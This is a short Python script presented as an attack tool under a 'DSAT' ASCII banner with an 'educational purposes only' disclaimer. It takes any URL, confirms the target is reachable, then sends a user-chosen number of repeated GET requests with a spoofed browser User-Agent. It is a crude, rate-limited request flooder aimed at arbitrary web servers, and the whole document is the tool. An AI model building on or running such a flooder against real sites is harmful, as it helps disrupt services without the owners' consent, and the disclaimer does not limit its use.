import requests as req
import time

class Main:
    def __init__(self):
        self.show_ascii()
        self.json_data = self.change_data_type_json()

    def show_ascii(self):
        ascii_art = r"""
    


▓█████▄   ██████  ▄▄▄     ▄▄▄█████▓
▒██▀ ██▌▒██    ▒ ▒████▄   ▓  ██▒ ▓▒
░██   █▌░ ▓██▄   ▒██  ▀█▄ ▒ ▓██░ ▒░
░▓█▄   ▌  ▒   ██▒░██▄▄▄▄██░ ▓██▓ ░ 
░▒████▓ ▒██████▒▒ ▓█   ▓██▒ ▒██▒ ░ 
 ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░ ▒ ░░   
 ░ ▒  ▒ ░ ░▒  ░ ░  ▒   ▒▒ ░   ░    
 ░ ░  ░ ░  ░  ░    ░   ▒    ░      
   ░          ░        ░  ░        
 ░                                 
    =============================
    EDUCATIONAL PURPOSES ONLY!!!!
    =============================    
        """
        print(ascii_art)

    def change_data_type_json(self):
        return {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

    def check_target(self):
        self.url_data = input("Enter a legit/full format URL >>> ")
        try:
            response = req.get(self.url_data, headers=self.json_data)
            print(f"[+] Target reachable. Status Code: {response.status_code}")
        except Exception as e:
            print(f"[-] Failed to reach target: {e}")

    def start_attack(self):
        try:
            vector = int(input("How many 'user' tries >>> "))
        except ValueError:
            print("[-] Please enter a valid number.")
            return

        for i in range(1, vector + 1):
            try:
                response = req.get(self.url_data, headers=self.json_data)
                print(f"[{i}] Sent request - Status: {response.status_code}")
                time.sleep(0.2)
            except Exception as e:
                print(f"[{i}] Error: {e}")

if __name__ == "__main__":
    tool = Main()
    tool.check_target()
    tool.start_attack()
